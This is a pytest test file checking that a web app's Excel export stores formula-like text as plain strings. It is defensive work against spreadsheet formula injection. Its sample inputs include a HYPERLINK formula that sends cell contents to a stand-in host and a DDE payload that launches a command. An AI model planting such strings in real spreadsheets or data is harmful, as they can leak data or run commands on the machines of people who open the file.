"""ADP-79 / B-02: the "Excel with highlighting" export must never contain live
formulas. Workbooks are written in memory and read back with openpyxl (no
spreadsheet program is ever opened). Synthetic data only."""
import datetime
import io

import openpyxl
import pandas as pd
import pytest

from web_app import export_to_excel_with_highlighting, looks_like_formula

HOSTILE = [
    '=HYPERLINK("http://example.invalid/?x="&A1,"click")',
    "+1+1",
    "-2+3",
    "@SUM(A1:A2)",
    "  =1+1",
    "\t=1+1",
    "\r=1+1",
    "\n=1+1",
]


def _load(data: bytes):
    return openpyxl.load_workbook(io.BytesIO(data))


def _all_cells(wb):
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for cell in row:
                if cell.value is not None:
                    yield ws.title, cell


def test_formula_like_text_in_data_cells_is_written_as_literal_text():
    df = pd.DataFrame({"note": HOSTILE, "n": range(len(HOSTILE))})
    wb = _load(export_to_excel_with_highlighting(df, []))
    ws = wb["Data"]
    for i, text in enumerate(HOSTILE, start=2):
        cell = ws.cell(row=i, column=1)
        assert cell.data_type == "s", f"row {i} stored as {cell.data_type}"
        assert cell.value == text.replace("\r", "\n")  # XML normalises CR to LF on round trip
    assert not [c for _, c in _all_cells(wb) if c.data_type == "f"]


def test_formula_like_column_headers_are_written_as_literal_text():
    df = pd.DataFrame({'=HYPERLINK("http://x","c")': [1], "+evil": [2], "@bad": [3], "ok": [4]})
    ws = _load(export_to_excel_with_highlighting(df, []))["Data"]
    headers = [ws.cell(row=1, column=c) for c in range(1, 5)]
    assert [h.data_type for h in headers] == ["s", "s", "s", "s"]
    assert headers[0].value == '=HYPERLINK("http://x","c")'


def test_formula_like_text_in_the_issues_sheet_is_literal_text():
    df = pd.DataFrame({"a": ["=1+1"]})
    issues = [{"type": "invalid_value", "severity": "error", "row": 0, "column": "a",
               "value": "=cmd|' /C calc'!A0", "message": "=Bad value"}]
    wb = _load(export_to_excel_with_highlighting(df, issues))
    assert "Issues" in wb.sheetnames
    assert not [c for _, c in _all_cells(wb) if c.data_type == "f"]
    values = [c.value for t, c in _all_cells(wb) if t == "Issues"]
    assert "=cmd|' /C calc'!A0" in values and "=Bad value" in values


def test_genuine_numbers_and_dates_stay_typed_including_negative_numbers():
    df = pd.DataFrame({
        "neg": [-5, -0.25, 3],
        "when": pd.to_datetime(["2024-01-02", "2024-02-03", "2024-03-04"]),
        "flag": [True, False, True],
    })
    ws = _load(export_to_excel_with_highlighting(df, []))["Data"]
    assert [ws.cell(row=r, column=1).value for r in (2, 3, 4)] == [-5, -0.25, 3]
    assert all(ws.cell(row=r, column=1).data_type == "n" for r in (2, 3, 4))
    assert isinstance(ws.cell(row=2, column=2).value, datetime.datetime)
    assert ws.cell(row=2, column=3).value is True


def test_highlighting_and_comments_still_work_on_neutralised_cells():
    df = pd.DataFrame({"a": ["=1+1", "fine"]})
    issues = [{"type": "invalid_value", "severity": "error", "row": 0, "column": "a",
               "message": "bad one"},
              {"type": "invalid_value", "severity": "warning", "row": 1, "column": "a",
               "message": "meh"}]
    ws = _load(export_to_excel_with_highlighting(df, issues))["Data"]
    assert ws["A2"].value == "=1+1" and ws["A2"].data_type == "s"
    assert ws["A2"].fill.start_color.rgb.endswith("FFCCCB")
    assert ws["A3"].fill.start_color.rgb.endswith("FFE5B4")
    assert ws["A2"].comment.text == "bad one"


@pytest.mark.parametrize("text,expected", [
    ("=1", True), ("+1", True), ("-1", True), ("@x", True), (" \t=x", True),
    ("hello", False), ("a=b", False), ("", False), (5, False), (None, False),
])
def test_looks_like_formula(text, expected):
    assert looks_like_formula(text) is expected
